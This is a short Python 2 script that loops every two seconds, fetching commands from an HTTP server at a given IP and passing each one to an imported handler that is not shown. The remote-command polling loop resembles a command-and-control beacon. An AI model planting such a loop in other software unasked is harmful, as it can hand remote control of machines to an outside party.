import requests
import json
import subprocess
import sys
import time
from commands import commands

def load_command(ip,port=5001):

    """get commands from server

    """

    url = "http://%s:%s/commands/" % (ip,port)
    try:
        req = requests.get(url)
        code = req.status_code
        rd = json.loads(req.text)
        command = rd["content"]
        commands.post(command)
    except:
        print "service is off ..."


def load(ip,port):
    while True:
        time.sleep(2)
        load_command(ip)




